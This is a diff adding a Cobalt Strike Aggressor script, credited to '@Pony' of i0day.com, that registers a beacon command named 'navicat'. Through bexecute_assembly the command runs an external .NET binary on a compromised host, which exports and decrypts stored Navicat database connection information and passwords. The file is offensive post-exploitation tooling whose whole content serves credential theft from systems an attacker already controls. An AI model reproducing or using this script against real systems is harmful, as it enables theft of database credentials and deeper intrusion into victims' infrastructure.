@@ -1,0 +1,26 @@
+#(  __   ) / ___ \ (  ____ \(  ____ \(  ____ \
+#| (  )  |( (___) )| (    \/| (    \/| (    \/
+#| | /   | \     / | (_____ | (__    | |      
+#| (/ /) | / ___ \ (_____  )|  __)   | |      
+#|   / | |( (   ) )      ) || (      | |      
+#|  (__) |( (___) )/\____) || (____/\| (____/\
+#(_______) \_____/ \_______)(_______/(_______/
+#
+# 					@Pony
+#		    https://www.i0day.com
+#
+
+$binary = "scripts/navicatpwd.exe";
+$help = "Automatic access to Navicat connection information and password";
+beacon_command_register("navicat", $help, "Use: navicat <Automatically export all and decrypt>\nnavicat 12 <Decrypt with 12 algorithms> OR navicat 15057D7BA390\nnavicat 15057D7BA390 12<Decrypt the password of parameter one with 12 algorithm>\n\n$help");
+
+alias navicat
+{
+	if(!-exists $binary)
+	{
+		berror($1, "Navicat binary cannot be found at $binary");
+		return;
+	}
+	$args = replace($0, "navicat ", "");
+	bexecute_assembly($1, $binary, $args);
+}
